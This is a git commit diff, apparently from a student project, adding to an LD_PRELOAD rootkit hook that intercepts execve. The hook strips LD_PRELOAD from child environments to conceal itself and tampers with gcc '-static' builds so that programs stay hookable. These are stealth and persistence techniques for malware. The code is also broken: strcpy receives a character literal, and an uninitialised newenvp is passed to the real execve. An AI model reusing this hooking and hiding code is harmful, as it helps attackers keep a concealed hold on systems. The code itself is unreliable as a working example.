ef144a535ed2af65eac22b092bdce7c27f647468
landyy <rmb2555@rit.edu>
2017-03-21 13:53:31 -0400

    added more to h00kExec

--- h00k/h00kExec.c
+++ h00k/h00kExec.c
@@ -3,18 +3,40 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <string.h>
+
+//grabs the env variables at linking time(?)
+extern char **environ;
 
 //sets the old execve
 int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
+char **newenvp;
+
+//used to remove LD_PRELOAD when the library is loaded. We will load it back in 
+//at the end.
+void init(){
+	
+	
+}
 
 int execve(const char *filename, char *const argv[], char *const envp[]){
+
+	char deflt[] = "LD_PRELOAD=";
 
 	if(!old_execve){
 		old_execve = dlsym(RTLD_NEXT,"execve");		
 	}
 
+
+	//remove LD_PRELOAD for enviroment variables
+	for(int x = 0; envp[x] != NULL; x++){
+		if(strstr(envp[x], "LD_PRELOAD=")){
+			strcpy(envp[x], '\0');
+		
+		}
+	}
+	
 	//breaks static compiling
-	//TODO
 	if(strstr(filename, "gcc")){
 		for(int i =0; argv[i] != NULL; i++){
 			if(strstr(argv[i],"-static")){
@@ -24,12 +46,5 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 		}
 	}
 
-	//remove LD_PRELOAD for enviroment variables
-	//TODO
-	if(strstr(filename, "printenv")){
-		
-	}
-
-	
-
+	return old_execve(filename, argv, newenvp);
 }
